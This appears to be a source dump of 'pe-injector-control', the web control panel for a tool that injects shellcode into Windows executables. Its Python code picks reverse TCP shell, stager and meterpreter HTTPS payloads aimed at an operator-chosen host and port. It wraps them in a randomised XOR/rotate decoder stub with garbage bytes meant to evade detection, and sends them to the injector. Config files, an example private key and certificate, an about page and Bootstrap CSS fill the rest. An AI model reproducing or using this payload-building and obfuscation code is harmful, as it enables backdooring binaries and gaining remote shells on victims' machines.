            scb.set_params(host=shellhost, port=int(shellport), shellcode=textarea)
            if scb.select_shellcode(shellselect):
                if xor == "true" or xor == "True" or xor == "TRUE" or xor == "1":
                    xor = True
                else:
                    xor = False
                code = scb.get_shellcode_x86(encode=xor)
                code2 = scb.get_shellcode_x64(encode=xor)
                if code is not None:
                    if "x86" in system:
                        print("Code (x86):", len(code))
                        lasterror = self.simply_shellcode_send(command=LibPeProtocol.CMD_SEND_SET_PAYLOAD_X86, data=code, host=injhost, port=injport, token=token)
                        if lasterror is None:
                            self.simply_shellcode_send(command=LibPeProtocol.CMD_SEND_SET_PAYLOAD_NAME_X86, data=name, host=injhost, port=injport, token=token)
                        else:
                            self.wfile.write(("x86: "+lasterror+"\n").encode("Ascii"))
                    if "x64" in system:
                        print("Code (x64):", len(code2))
                        lasterror = self.simply_shellcode_send(command=LibPeProtocol.CMD_SEND_SET_PAYLOAD_X64, data=code2, host=injhost, port=injport, token=token)
                        if lasterror is None:
                            self.simply_shellcode_send(command=LibPeProtocol.CMD_SEND_SET_PAYLOAD_NAME_X64, data=name, host=injhost, port=injport, token=token)
                        else:
                            self.wfile.write(("x64: "+lasterror+"\n").encode("Ascii"))
                    self.wfile.write(b"OK")
                else:
                    print(scb.get_last_error())
                    self.wfile.write(scb.get_last_error().encode("Ascii"))
            else:
                print(scb.get_last_error())
                self.wfile.write(scb.get_last_error().encode("Ascii"))
            # fin
            self.wfile.flush()

    # check IPv4
    def is_valide_ip(self,ip):
        try:
            ipaddress.ip_address(ip)
            return True
        except Exception:
            return False

    # send a shellcode
    def simply_shellcode_send(self, command, data, host, port, token):
        # connect
        con = LibPeProtocol(token=token, host=host, port=port)
        con.send_command(command=command, data=data)
        return con.get_last_error()

```

`pe-injector-control/ShellCodeBuilder.py`:

```py
#!/usr/bin/env python

"""
    Provides shellcode building.
"""

# Import shellcode builders
from thirdparty.WinIntelPE64 import winI64_shellcode
from thirdparty.WinIntelPE32 import winI32_shellcode
import random
import struct
import os
from gc import garbage

class ShellCodeBuilder(object):

    def __init__(self, ):
        self.__host = None
        self.__port = None
        self.__shellcode = None
        self.__shellcodes = ["reverse_shell_tcp",
                             "reverse_tcp_stager_threaded",
                             "reverse_meterpreter_https_threaded",
                             "user_supplied_shellcode",
                             "user_supplied_shellcode_threaded",
                             "demo_nop",
                             "demo_calc"]
        self.__selected_shellcode = None
        self.__error = ""

    def set_params(self, host, port, shellcode=None):
        self.__host = host
        self.__port = port
        self.__shellcode = shellcode

    @staticmethod
    def __rol(byte, count):
        return bytes([(byte << count | byte >> (8 - count)) & 0xff])

    @staticmethod
    def __enc_shellcode(shellcode, cnt, xor):
        decoder = b""
        for byte in shellcode:
            decoder += ShellCodeBuilder.__rol(byte ^ xor, cnt)

        return decoder

    @staticmethod
    def __generate_garbage():
        rnd = random.randint(1, 4)
        # Break alignment
        if rnd in (1, 2):
          return b"\xeb\xff\xc0\x48"
        
          # Random Garbage    
        elif rnd is 3:
          rnd = random.randint(1, 6)
          return b"\xeb" + struct.pack("<B", rnd) + os.urandom(rnd)  
          
          # Insert NOPs
        else:
          return b"\x90" * random.randint(1, 2)
          
        
    @staticmethod
    def __build_decoder_stub(length, rnd, rnd2):
        """
        x86/x64 produces the same code
      
        ASM:
        
        _start:               
          jmp short encoded    ; Load Address
        getaddr:
          pop ebx              ; stores data
          mov ecx, xxxxxxxx    ; shellcode size
        decode:
          ror byte ptr [ecx + ebx - 1], rnd  ; Random Bit Rotate
          xor byte ptr [ecx + ebx - 1], rnd2 ; Random XOr    
          loop short decode
          
          jmp ebx ; jmp to shellcode
        encoded:
          call getaddr
        ; Shellcode
        end _start
        """
      
        # Add some garbage
        garbage1 = ShellCodeBuilder.__generate_garbage()
        garbage2 = ShellCodeBuilder.__generate_garbage()
        garbage3 = ShellCodeBuilder.__generate_garbage()
      
        decoder = ShellCodeBuilder.__generate_garbage()
        decoder += b"\x90\xeb"
        decoder += struct.pack("<B", 0x14 + len(garbage1) + len(garbage2) + len(garbage3))
        decoder += garbage1
        decoder += b"\x5b\xb9"
        decoder += struct.pack("<I", length)
        decoder += garbage2
        decoder += b"\xc0\x4c\x0b\xff"
        decoder += struct.pack("<B", rnd)
        decoder += garbage3
        decoder += b"\x80\x74\x19\xff"
        decoder += struct.pack("<B", rnd2)
        decoder += b"\xe2"
        decoder += struct.pack("<B", 0xf4 - (len(garbage2) + len(garbage3)))
        decoder += b"\xff\xe3\xe8"
        decoder += struct.pack("<B", 0xe7 - (len(garbage1) + len(garbage2) + len(garbage3)))
        decoder += b"\xff\xff\xff"
        return decoder
      
    @staticmethod
    def __encode(shellcode, iterations=3):
        # Initialize Random Vars
        random.seed()
        for i in range(1, iterations):
          rnd1 = random.randint(1, 7)
          rnd2 = random.randint(1, 255)
        
          # decoder 1
          decoder = ShellCodeBuilder.__build_decoder_stub(len(shellcode), rnd1, rnd2)
          # payload
          shellcode = ShellCodeBuilder.__enc_shellcode(shellcode, rnd1, rnd2)
          shellcode =  decoder + shellcode  
          
        return shellcode

    def __check_params(self):
        if self.__selected_shellcode is None:
            self.__error = "No shellcode selected"
            return False
        if (self.__selected_shellcode.find("user") is not -1) and (self.__shellcode is None):
            self.__error = "You have to provide a shellcode for this payload"
            return False
        elif (self.__selected_shellcode.find("demo") is not -1):
            self.__error = ""
            return True    
        elif (self.__port is None) or (self.__host is None):
            self.__error = "You have to provide host and port for this payload"
            return False
        return True

    def __return_shellcode(self, builder):
        if self.__selected_shellcode == "reverse_shell_tcp":
            return builder.reverse_shell_tcp()
        elif self.__selected_shellcode == "reverse_tcp_stager_threaded":
            return builder.reverse_tcp_stager_threaded()
        elif self.__selected_shellcode == "reverse_meterpreter_https_threaded":
            return builder.meterpreter_reverse_https_threaded()
        elif self.__selected_shellcode == "user_supplied_shellcode":
            return builder.user_supplied_shellcode()
        elif self.__selected_shellcode == "user_supplied_shellcode_threaded":
            return builder.user_supplied_shellcode_threaded()
        elif self.__selected_shellcode == "demo_nop":
            return builder.demo_nop()
        elif self.__selected_shellcode == "demo_calc":
            return builder.demo_calc()
        return None

    def list_shellcodes(self):
        return self.__shellcodes

    def select_shellcode(self, shellcode):
        if shellcode not in self.__shellcodes:
            self.__error = "unknown shellcode"
            return False

        self.__selected_shellcode = shellcode
        return True

    def get_shellcode_x86(self, encode=False):
        if not self.__check_params():
            return None
        builder = winI32_shellcode(self.__host, self.__port, self.__shellcode)
        return ShellCodeBuilder.__encode(self.__return_shellcode(builder)) if encode else self.__return_shellcode(builder)

    def get_shellcode_x64(self, encode=False):
        if not self.__check_params():
            return None
        builder = winI64_shellcode(self.__host, self.__port, self.__shellcode)
        if encode:
            return ShellCodeBuilder.__encode(self.__return_shellcode(builder))
        else:
            return self.__return_shellcode(builder)

    def get_last_error(self):
        return self.__error

```

`pe-injector-control/cert_example_do_not_use_this.pem`:

```pem
-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQCbVUxNcxQ5W9im
vXUKFov+Z9xvxBY+M9XtHL0WYQ1+hG0qipEOrOIS0zpoVwl/Uf+KxOb3QDvSs0cP
5gHKwBgdwtYZrlbB1EQ/6W/6wgMm1R1gqgv5mR/C+ZnSQ0VhDKyuyHiiYvB0IBOP
8jaddIMpxCaDkRk86PWvG//sRpLpw0Er9E1y+S8UK4Lpx0BiCV78sReHkpi5GlGP
gk7npsEQ2EcpbPQ4rsjuu2YPpI8BzGCx0JYTmxbo6vbdNSm73ub+bpEVLT/SNjsK
6Shm3U73dRoA+st0gOo33wI1wZjvNni5M4+SzepUVdVoC6NoH9Y5aS1Z6xSzV7u8
vS6SigFRAgMBAAECggEAfElV0iqgJfz9bvzspvO/dAH6eVs2SPME2sJB8aQaPf8L
shxJUKq4AUQN2eq6aKtdgtVl0LQOqdpUo73v9SCaq0V4Nfgu5sxHB7RqqwONrgab
iPrGtiH1Lfa1Q24cFzki+n7hN11e9CuuO2EcngPZ5xNRlbgFr5ze6AvJTG5zoqIf
YLPqetNreuMQoH1P+Tl//RpuvYZ6gsqzolzaBr4UE/eOxBqVmMUPZtuDvNm5/dUb
0G6AI01sPpkwi2xZeQ/C/qY33p8Vgg72SDuTg/dWfp/m7mxg+bLjLUwLHHf+IpWi
E2Rmj1rlPYWDBvHNm7Bfc8dnhoKXiH3lMJ1ekKndGQKBgQDKC/j+0GLnt3RyN2iY
7tLdRdOArcwCSLZvdoQYk/Rcf7eP+UlEIfZd3S3o9STmVDpjajTcjzMk5C7IXKhU
NddPrJ4p7WqTrCRfg/bpBVOs9bd+rJElEWAWRGJ3WvOM/jcWCp3uwMRoPIMpJn40
ntwSn2kCxxOJO+y+YxOKG88tPwKBgQDEz/XI56rNDtNiCEXe/AwEmztN1hu6ka3f
PcpzqnLdZSSlmFpRgkbD9amYmM6nk6vHEB5S8EKmQpyb/d2WRptlnAiNe/0yW5zd
W17h0NARREofEpZ4IBwCkqld1K/xCfwNgaENXfdnKYLwJu6XOxUsxJYutENlkUQK
/2l/XtrdbwKBgAVLHQHoCb9SYh2f8ACZuTKM4sarRv4EU6tF6p4OOke2HOQLvuyn
CyJYahyBV68lI8Z5ANuKcOeVhtg+/TX/lx2CQz6L9s/ZobZS6cQfHJsacO1DriXP
d7n9nqrL2jembWEJdCvOJxcoBrOsS4ArbU6bmI+3EX717/To+ZkTs3DXAoGAFeqa
ki7KJF+cRnRpY3Vp2TF4HyjSmaoTVKLK4qp+dA0JUa9vj1gUjUnUAvwxNxQIsvgm
iFHc+iq8ydoxTMS8FUqU4TyHa44sH7JHFJpuMR4Lqv4k52eb9uViGuLOXOchvFdN
GfH21PQYcqnDM/AOYZfaqYTFZJASpa7fjqF/ed0CgYEAiFzWkbRB5p65w3tEgtE+
TLF0sv3C1A9fwAjEURL8owP4xSzdQKqn++q0csgD7vxCTjgO738ksVIbsDj0Uc2E
pxsp5BZMenNcoO1h8dUE5DTmxggMFFuyMFzEOBYmPrbiz/Rhub2PawYxUdeF3Dc9
wKpKgcvV4IhmPuk/TAEw3k8=
-----END PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIEBTCCAu2gAwIBAgIJAMoSMJUVXbK7MA0GCSqGSIb3DQEBCwUAMIGYMQswCQYD
VQQGEwJMTzESMBAGA1UECAwJbG9jYWxob3N0MRIwEAYDVQQHDAlsb2NhbGhvc3Qx
EjAQBgNVBAoMCWxvY2FsaG9zdDESMBAGA1UECwwJbG9jYWxob3N0MRIwEAYDVQQD
DAlsb2NhbGhvc3QxJTAjBgkqhkiG9w0BCQEWFmxvY2FsaG9zdEBsb2NhbGhvc3Qu
bG8wHhcNMTUwOTEyMTQxMDEyWhcNMTkxMDIxMTQxMDEyWjCBmDELMAkGA1UEBhMC
TE8xEjAQBgNVBAgMCWxvY2FsaG9zdDESMBAGA1UEBwwJbG9jYWxob3N0MRIwEAYD
VQQKDAlsb2NhbGhvc3QxEjAQBgNVBAsMCWxvY2FsaG9zdDESMBAGA1UEAwwJbG9j
YWxob3N0MSUwIwYJKoZIhvcNAQkBFhZsb2NhbGhvc3RAbG9jYWxob3N0LmxvMIIB
IjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAm1VMTXMUOVvYpr11ChaL/mfc
b8QWPjPV7Ry9FmENfoRtKoqRDqziEtM6aFcJf1H/isTm90A70rNHD+YBysAYHcLW
Ga5WwdREP+lv+sIDJtUdYKoL+ZkfwvmZ0kNFYQysrsh4omLwdCATj/I2nXSDKcQm
g5EZPOj1rxv/7EaS6cNBK/RNcvkvFCuC6cdAYgle/LEXh5KYuRpRj4JO56bBENhH
KWz0OK7I7rtmD6SPAcxgsdCWE5sW6Or23TUpu97m/m6RFS0/0jY7CukoZt1O93Ua
APrLdIDqN98CNcGY7zZ4uTOPks3qVFXVaAujaB/WOWktWesUs1e7vL0ukooBUQID
AQABo1AwTjAdBgNVHQ4EFgQUWNReY6DwnxEnCLFn6sCOmja+lWgwHwYDVR0jBBgw
FoAUWNReY6DwnxEnCLFn6sCOmja+lWgwDAYDVR0TBAUwAwEB/zANBgkqhkiG9w0B
AQsFAAOCAQEAY2X6yYpqrtttH/auoL8bs+sh0nT0EM6uzccRQArzcJR44Ic+yzbn
l/1qb5OE/ZBRecv1HkunzLS/ykCFkr7wCPQclWP9QOB1sKB2XABeb5ygH3QjYWDO
9fVIneut/C5Fvlzo2cfpOQMQK5CAOSgRpk1kDpIxaoe52yn1HRhPXZoavdEjQSrM
ArfLPILOjPf7ktS/9unfmKeX7XIDi5RgPpMI/+zSKQ1RBAHFPgNSsCl5P97nvfMu
FoeyibkyZYF7BDCempe0GbilwR9hcbl0O/S8NF8GSxBg2YVItmpN3Hr3h/K50zrX
X47sGpmMQUiI7uvBRyX11srGwNzWpmniFQ==
-----END CERTIFICATE-----

```

`pe-injector-control/config.ini`:

```ini
[WEBSERVER]
port = 3333
localhostonly = false
usessl = true
cert = cert_example_do_not_use_this.pem
basicauth = False
passhash = 

[INJECTOR]
ip = 127.0.0.1
port = 31338
token = AAAA000000000000000000000000000000000000000000000000000000000000


```

`pe-injector-control/config_default.ini`:

```ini
[WEBSERVER]
; webserver listening port
port = 4444
; TRUE: webserver only accessible via 127.0.0.1
localhostonly = true
; TRUE: webserver only accessible via https://****
usessl = true
; path to a private key and the corresponding certificate (all in one file)
cert = server.pem
; use Basic Authentication (username:password)
basicauth = false
; SALT +':'+ sha256(sha256(SALT)+sha256(base64(USER+':'+PASS)))
passhash = NULL:NULL

[INJECTOR]
; injector IP
ip = 127.0.0.1
; injector control port
port = 31338
; token
token = AAAA000000000000000000000000000000000000000000000000000000000000


```

`pe-injector-control/html/about.htm`:

```htm
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- ^ this 3 Meta-Tags firstn;  -->
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="favicon.ico">

    <title>peinjector-control</title>

    <!-- Bootstrap-CSS -->
    <link href="css/bootstrap.min.css" rel="stylesheet">
    <!-- Bootstrap-Theme -->
    <link href="css/bootstrap-theme.min.css" rel="stylesheet">
    <!-- second Theme -->
    <link href="css/starter-template.css" rel="stylesheet">
    <!-- ABOUT CSS -->
    <style>
      pre {min-width:420px; background-color:#000000; color:#00FF00; font-size: 0.53em; font-family: Fixedsys,Courier,monospace; padding:10px;}
    </style>
  </head>

  <body role="document">

    <!-- Navbar -->
    <nav class="navbar navbar-inverse navbar-fixed-top">
      <div class="container">
        <div class="navbar-header">
          <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
            <span class="sr-only">Navigation ein-/ausblenden</span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
          </button>
          <a class="navbar-brand" href="#">peinjector-control</a>
        </div>
        <div id="navbar" class="navbar-collapse collapse">
          <ul class="nav navbar-nav">
            <li><a href="index.htm">start</a></li>
            <li><a href="injector.htm">injector</a></li>
            <li><a href="shellcode.htm">shellcode</a></li>
            <li><a href="settings.htm">settings</a></li>
            <li class="active"><a href="about.htm">about</a></li>
          </ul>
        </div><!--/.nav-collapse -->
      </div>
    </nav><!-- END Navbar -->


    <!-- main container -->
    <div class="container theme-showcase" role="main">
      
      
      <!-- logo -->
      <div class="starter-template">
        
        <pre><b><code id="asciilogo">         ,x-"F   ]    Ax^" q    hp"  `u jM""u    a^ ^, j"  "*g_   p  ^mg_   N    "-x,         
           jLs*^6   `_  _&*"  q  _,NF   "wp"    "*g"   _NL_  p  "-d_   F   ]"*u_F             
            ]   J_,x-E   3_  jN^" `u _w^*_  _R"""R_  _J^w_ j"  "pL_  f   7^-L_F   #__         
         w*^0   4   9__sAF" `L  _Dr"  m__m""q_,,_a^"m__*  "qA_  j" ""Au__f   J   0^           
            #_,J@^""p  `_ _jp-""q  _Dw^" ^cj*"  "*,j^  "p#_  y""^wE_ _F   F"^qN,_j            
            L  ]   k,w@#"""_  "_a*^E   ba-" ^qjqj-""^pe"  J^-u_f  _f "q@w,j   f  jL _         
         -,Jp*^#""9   L  5_a*N"""q__INr" "q_e^"^"*,p^""qME_ y"""p6u,f  j'  f "N^--LL          
         _ t  J  __,Jb--N""",  *_s0M`""q_a@NW_@@_JP^u_p"""p4a,p" _F""V--wL,_F_ F  #           
          r#^^0""E" 6  q  q__hg-@4""*,_Z*q_"^pwpwr""p*C__@""0N-qdL_p" p  J" 3""5^^0r-         
           F Jp 9__b__M,Juw*w*^#^9#""EED*dP_@EZEZ@^E@*#EjP"5M"gM@p*Ww&,jL_J__f  F j           
         rNrr4r*pr4r@grNr@q@Ng@q@N0@N#@NNMpmgg@@ggmqgNN@NN@#@4p*@M@p4qp@w@m@Mq@r#rq@r         
          j  L 6 9""Q"#^q@NDNNNMpg----                  ----gggNNW#W4p^p@jF"P"]"j  F          
         a0,3_j_j_9FN@N@0NMp--                                  --ggNZNrNM"P_f_f_E,0a         
         "0^#-LJ_9"NNNMp--                                           -gN#@#"R_#g@q^9"         
         _F`@q4WBN@Np-                                                  -gNN@ZL#p"Fj_         
         JLE5@WRNp                                                          g@NNNF3_L         
         4JF@NNp- ---------------------------------------------------------- -g0WNNL@         
         40NNh-    ____  _____ _____    _____ _____ _____ ____  _____ _____    -gN#B0         
         NN#p     |    \|     |   __|  |  |  |   __|  _  |    \|   __| __  |     j0NN         
         ##       |  |  |  |  |__   |  |     |   __|     |  |  |   __|    -|       d#         
        J#        |____/|_____|_____|  |__|__|_____|__|__|____/|_____|__|__|        #L        
       J#                                                                            #L       
      J# ---------------------------------------------------------------------------- #L      
     J#               _____ _____    _____ _____ _____ ____  _____ _____               #L     
    J#               |  _  |   __|  |  |  |   __|  _  |    \|   __| __  |               #L    
   J#                |   __|   __|  |     |   __|     |  |  |   __|    -|                #L   
  J#                 |__|  |_____|  |__|_ _,.-----.,_ |____/|_____|__|__|                 #L  
 J#                                    ,-~           ~-.                                   #L 
'# --------------------------------- ,^___           ___^. -------------------------------- #'
t#  _____ _____ _____ _____ _____   /~"   ~"   .   "~   "~\  _____ _____ ____  _____ _____  #j
t# |     |  _  |_   _|     |     | Y  ,--._    I    _.--.  Y    __|  _  |    \|   __| __  | #j
t# |  |  |   __| | | |-   -|  |  | | Y     ~-. | ,-~     Y |    __|     |  |  |   __|    -| #j
t# |_____|__|    |_| |_____|_____| | |        }:{        | | _____|__|__|____/|_____|__|__| #j
.#                                 j l       / | \       ! l                                #'
 Y#---------------------------- .-~  (__,.--" .^. "--.,__)  ~-. -------------------------- #Y 
  Y#      _____ _____ _____ ___(           / / | \ \           ) _ _____ __    _____      #Y  
   Y#    |   __|   __|     |_   \.____,   ~  \/"\/  ~   .____,/   | __  |  |  |   __|    #Y   
    Y#   |__   |   __|   --| | | ^.____                 ____.^    | __ -|  |__|   __|   #Y    
     Y#  |_____|_____|_____| |_| |_ | |T ~\  !   !  /~ T| | |__|__|_____|_____|_____|  #Y     
      Y#                            | |l   _ _ _ _ _   !| |                           #Y      
       Y#, ------------------------ | l \/V V V V V V\/ j | ----------------------- ,#Y       
        Y#            _____ _____ _ l  \ \|_|_|_|_|_|/ /  ! ___    ___              #Y        
        t#           |   __|   __|   \  \[T T T T T TI/  /   | |  |   |             #j        
        t#           |__   |   __|   -\  `^-^-^-^-^-^'  /  | | |  | | |             #j        
        t#           |_____|_____|____ \               / |_|___|  |___|             #j        
        t#                              \.           ,/                             #j        
        t# ------------------------------ "^-.___,-^" ----------------------------- #j        
        t#            _____ _____ _____ _____ _____ _____ _____    ___              #j        
        t#           |   __|   __|     |_   _|     |     |   | |  |_  |             #j        
        t#           |__   |   __|   --| | | |-   -|  |  | | | |   _| |_            #j        
        t#           |_____|_____|_____| |_| |_____|_____|_|___|  |_____|           #j        
        '#_                                                                         #'        
         ##_ --------------------------------------------------------------------- d#         
         NN#p         _____ _____ _____ _____ _____ _____ _____    _____         j0NN         
         40NNh_      |   __|   __|     |_   _|     |     |   | |  |   | |      _gN#B0         
         4JF@NNp_    |__   |   __|   --| | | |-   -|  |  | | | |  | | | |    _g0WNNL@         
         JLE5@WRNp_  |_____|_____|_____| |_| |_____|_____|_|___|  |_|___|  _g@NNNF3_L         
         _F`@q4WBN@Np_                                                  _gNN@ZL#p"Fj_         
         "0^#-LJ_9"NNNMp__ ----------------------------------------- _gN#@#"R_#g@q^9"         
         a0,3_j_j_9FN@N@0NMp__                                  __ggNZNrNM"P_f_f_E,0a         
          j  L 6 9""Q"#^q@NDNNNMpg____                  ____gggNNW#W4p^p@jF"P"]"j  F          
         rNrr4r*pr4r@grNr@q@Ng@q@N0@N#@NNMpmgg@@ggmqgNN@NN@#@4p*@M@p4qp@w@m@Mq@r#rq@r         
           F Jp 9__b__M,Juw*w*^#^9#""EED*dP_@EZEZ@^E@*#EjP"5M"gM@p*Ww&,jL_J__f  F j           
         -r#^^0""E" 6  q  q__hg-@4""*,_Z*q_"^pwpwr""p*C__@""0N-qdL_p" p  J" 3""5^^0r-         
           t  J  __,Jb--N""",  *_s0M`""q_a@NW_@@_JP^u_p"""p4a,p" _F""V--wL,_F_ F  #           
         _,Jp*^#""9   L  5_a*N"""q__INr" "q_e^"^"*,p^""qME_ y"""p6u,f  j'  f "N^--LL_         
            L  ]   k,w@#"""_  "_a*^E   ba-" ^qjqj-""^pe"  J^-u_f  _f "q@w,j   f  jL           
            #_,J@^""p  `_ _jp-""q  _Dw^" ^cj*"  "*,j^  "p#_  y""^wE_ _F   F"^qN,_j            
         w*^0   4   9__sAF" `L  _Dr"  m__m""q_,,_a^"m__*  "qA_  j" ""Au__f   J   0^--         
            ]   J_,x-E   3_  jN^" `u _w^*_  _R"""R_  _J^w_ j"  "pL_  f   7^-L_F   #           
           jLs*^6   `_  _&*"  q  _,NF   "wp"    "*g"   _NL_  p  "-d_   F   ]"*u_F             </code></b></pre>
        <br/><center><b> - Authors: A.A. - G.A. - L.W. - S.J. - <b></center><br/>
                <center><b> - Version 1.0 - <b></center><br/>
        <audio id="audiocontrol" loop>
          <source src="music/meric_skiff-resistor_arpanauts.mp3" type="audio/mpeg">
          Your browser does not support the audio element.
        </audio>
        
    </div> <!-- END main container -->


    <!-- Bootstrap-JavaScript
    ================================================== -->
    <script src="js/jquery-2.1.3.min.js"></script>
    <script src="js/bootstrap.min.js"></script>
    
    
    <!-- My JavaScript
    ================================================== -->
    <script type="text/javascript">
      /**
       * Returns a random integer between min (inclusive) and max (inclusive)
       * Using Math.round() will give you a non-uniform distribution!
       */
      function getRandomInt(min, max) {
          return Math.floor(Math.random() * (max - min + 1)) + min;
      }
      
      // playlist
      var playlist = [
        "music/meric_skiff-resistor_arpanauts.mp3",
        "music/meric_skiff-resistor2_digital_native.mp3",
        "music/meric_skiff-resistor2_hhavok-intro.mp3",
        "music/meric_skiff-resistor2_jumpshot.mp3"
        ];
        
      // start player with random music
      var audioobj = document.getElementById("audiocontrol");
      audioobj.src = playlist[getRandomInt(0,playlist.length-1)];
      audioobj.play(); 
      
      // scroll logo
      var logoobj = document.getElementById("asciilogo");
      setInterval(function(){
        var array = logoobj.innerHTML.split("\n");
        logoobj.innerHTML = "";
        for(i=1; i<array.length; i++) {
          logoobj.innerHTML += array[i] + "\n";
        }
        logoobj.innerHTML += array[0];
      }, 100);
    </script>

  </body>
</html>

```

`pe-injector-control/html/css/bootstrap-theme.min.css`:

```css
/*!
 * Bootstrap v3.3.4 (http://getbootstrap.com)
 * Copyright 2011-2015 Twitter, Inc.
 * Licensed under MIT (https://github.com/twbs/bootstrap/blob/master/LICENSE)
 */.btn-danger,.btn-default,.btn-info,.btn-primary,.btn-success,.btn-warning{text-shadow:0 -1px 0 rgba(0,0,0,.2);-webkit-box-shadow:inset 0 1px 0 rgba(255,255,255,.15),0 1px 1px rgba(0,0,0,.075);box-shadow:inset 0 1px 0 rgba(255,255,255,.15),0 1px 1px rgba(0,0,0,.075)}.btn-danger.active,.btn-danger:active,.btn-default.active,.btn-default:active,.btn-info.active,.btn-info:active,.btn-primary.active,.btn-primary:active,.btn-success.active,.btn-success:active,.btn-warning.active,.btn-warning:active{-webkit-box-shadow:inset 0 3px 5px rgba(0,0,0,.125);box-shadow:inset 0 3px 5px rgba(0,0,0,.125)}.btn-danger .badge,.btn-default .badge,.btn-info .badge,.btn-primary .badge,.btn-success .badge,.btn-warning .badge{text-shadow:none}.btn.active,.btn:active{background-image:none}.btn-default{text-shadow:0 1px 0 #fff;background-image:-webkit-linear-gradient(top,#fff 0,#e0e0e0 100%);background-image:-o-linear-gradient(top,#fff 0,#e0e0e0 100%);background-image:-webkit-gradient(linear,left top,left bottom,from(#fff),to(#e0e0e0));background-image:linear-gradient(to bottom,#fff 0,#e0e0e0 100%);filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#ffffffff', endColorstr='#ffe0e0e0', GradientType=0);filter:progid:DXImageTransform.Microsoft.gradient(enabled=false);background-repeat:repeat-x;border-color:#dbdbdb;border-color:#ccc}.btn-default:focus,.btn-default:hover{background-color:#e0e0e0;background-position:0 -15px}.btn-default.active,.btn-default:active{background-color:#e0e0e0;border-color:#dbdbdb}.btn-default.disabled,.btn-default:disabled,.btn-default[disabled]{background-color:#e0e0e0;background-image:none}.btn-primary{background-image:-webkit-linear-gradient(top,#337ab7 0,#265a88 100%);background-image:-o-linear-gradient(top,#337ab7 0,#265a88 100%);background-image:-webkit-gradient(linear,left top,left bottom,from(#337ab7),to(#265a88));background-image:linear-gradient(to bottom,#337ab7 0,#265a88 100%);filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#ff337ab7', endColorstr='#ff265a88', GradientType=0);filter:progid:DXImageTransform.Microsoft.gradient(enabled=false);background-repeat:repeat-x;border-color:#245580}.btn-primary:focus,.btn-primary:hover{background-color:#265a88;background-position:0 -15px}.btn-primary.active,.btn-primary:active{background-color:#265a88;border-color:#245580}.btn-primary.disabled,.btn-primary:disabled,.btn-primary[disabled]{background-color:#265a88;background-image:none}.btn-success{background-image:-webkit-linear-gradient(top,#5cb85c 0,#419641 100%);background-image:-o-linear-gradient(top,#5cb85c 0,#419641 100%);background-image:-webkit-gradient(linear,left top,left bottom,from(#5cb85c),to(#419641));background-image:linear-gradient(to bottom,#5cb85c 0,#419641 100%);filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#ff5cb85c', endColorstr='#ff419641', GradientType=0);filter:progid:DXImageTransform.Microsoft.gradient(enabled=false);background-repeat:repeat-x;border-color:#3e8f3e}.btn-success:focus,.btn-success:hover{background-color:#419641;background-position:0 -15px}.btn-success.active,.btn-success:active{background-color:#419641;border-color:#3e8f3e}.btn-success.disabled,.btn-success:disabled,.btn-success[disabled]{background-color:#419641;background-image:none}.btn-info{background-image:-webkit-linear-gradient(top,#5bc0de 0,#2aabd2 100%);background-image:-o-linear-gradient(top,#5bc0de 0,#2aabd2 100%);background-image:-webkit-gradient(linear,left top,left bottom,from(#5bc0de),to(#2aabd2));background-image:linear-gradient(to bottom,#5bc0de 0,#2aabd2 100%);filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#ff5bc0de', endColorstr='#ff2aabd2', GradientType=0);filter:progid:DXImageTransform.Microsoft.gradient(enabled=false);background-repeat:repeat-x;border-color:#28a4c9}.btn-info:focus,.btn-info:hover{background-color:#2aabd2;background-position:0 -15px}.btn-info.active,.btn-info:active{background-color:#2aabd2;border-color:#28a4c9}.btn-info.disabled,.btn-info:disabled,.btn-info[disabled]{background-color:#2aabd2;background-image:none}.btn-warning{background-image:-webkit-linear-gradient(top,#f0ad4e 0,#eb9316 100%);background-image:-o-linear-gradient(top,#f0ad4e 0,#eb9316 100%);background-image:-webkit-gradient(linear,left top,left bottom,from(#f0ad4e),to(#eb9316));background-image:linear-gradient(to bottom,#f0ad4e 0,#eb9316 100%);filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#fff0ad4e', endColorstr='#ffeb9316', GradientType=0);filter:progid:DXImageTransform.Microsoft.gradient(enabled=false);background-repeat:repeat-x;border-color:#e38d13}.btn-warning:focus,.btn-warning:hover{background-color:#eb9316;background-position:0 -15px}.btn-warning.active,.btn-warning:active{background-color:#eb9316;border-color:#e38d13}.btn-warning.disabled,.btn-warning:disabled,.btn-warning[disabled]{background-color:#eb9316;background-image:none}.btn-danger{background-image:-webkit-linear-gradient(top,#d9534f 0,#c12e2a 100%);background-image:-o-linear-gradient(top,#d9534f 0,#c12e2a 100%);background-image:-webkit-gradient(linear,left top,left bottom,from(#d9534f),to(#c12e2a));background-image:linear-gradient(to bottom,#d9534f 0,#c12e2a 100%);filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#ffd9534f', endColorstr='#ffc12e2a', GradientType=0);filter:progid:DXImageTransform.Microsoft.gradient(enabled=false);background-repeat:repeat-x;border-color:#b92c28}.btn-danger:focus,.btn-danger:hover{background-color:#c12e2a;background-position:0 -15px}.btn-danger.active,.btn-danger:active{background-color:#c12e2a;border-color:#b92c28}.btn-danger.disabled,.btn-danger:disabled,.btn-danger[disabled]{background-color:#c12e2a;background-image:none}.img-thumbnail,.thumbnail{-webkit-box-shadow:0 1px 2px rgba(0,0,0,.075);box-shadow:0 1px 2px rgba(0,0,0,.075)}.dropdown-menu>li>a:focus,.dropdown-menu>li>a:hover{background-color:#e8e8e8;background-image:-webkit-linear-gradient(top,#f5f5f5 0,#e8e8e8 100%);background-image:-o-linear-gradient(top,#f5f5f5 0,#e8e8e8 100%);background-image:-webkit-gradient(linear,left top,left bottom,from(#f5f5f5),to(#e8e8e8));background-image:linear-gradient(to bottom,#f5f5f5 0,#e8e8e8 